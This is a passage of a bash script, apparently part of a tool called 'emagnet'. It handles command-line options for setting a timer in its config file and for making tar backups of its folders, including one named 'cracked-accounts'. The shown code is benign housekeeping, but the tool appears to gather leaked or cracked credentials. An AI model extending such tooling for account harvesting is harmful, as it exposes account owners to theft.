    sed -i "30 i TIME=$2" ${EMAGNET_CONF}
    printf "%s\n" "$basename$0: config file has been updated -- time has been set to: $2 seconds"
    exit 1
    ;;

"-b" | "-backup" | "--backup")
    emagnet_conf &>/dev/null
    [[ ! -d ${EMAGNETBACKUP} ]] && mkdir -p ${EMAGNETBACKUP}
    if [[ "$2" = "all" ]]; then
        printf '%s %s' 'Please wait,' "creating a tar archive of $EMAGNET..."
        tar fczP $EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz --absolute-names $EMAGNET
        printf "..Done..\nBackup: $EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz\n" &>/dev/null
        exit 1
    elif [[ "$2" = "archive" || "$2" = "incoming" || "$2" = "cracked-accounts" ]]; then
        printf '%s %s' 'Please wait,' "creating a tar archive of $EMAGNET/${2}..."
        tar fczP "$EMAGNETBACKUP/emagnet-${2}-$(date +%d%m%Y).tar.gz" --absolute-names $EMAGNET/${2} &>/dev/null
        printf "ok...\nBackup: $EMAGNETBACKUP/emagnet-${2}-$(date +%d%m%Y).tar.gz\n"
        exit 1
    else
        echo -e "$basename$0: internal error -- you must choose one of the dirs: all, archive, cracked-accounts or incoming"
        exit 1
    fi
    ;;

"\?")
    printf "emagnet: internal error -- use --help for available commands'\n\n"
    exit 1
    ;;
"*")
    printf "emagnet: internal error -- use --help for available commands'\n\n"
    exit 1
    ;;

esac

(
    [[ -z $1 ]] && emagnet_usage
    exit 1
)
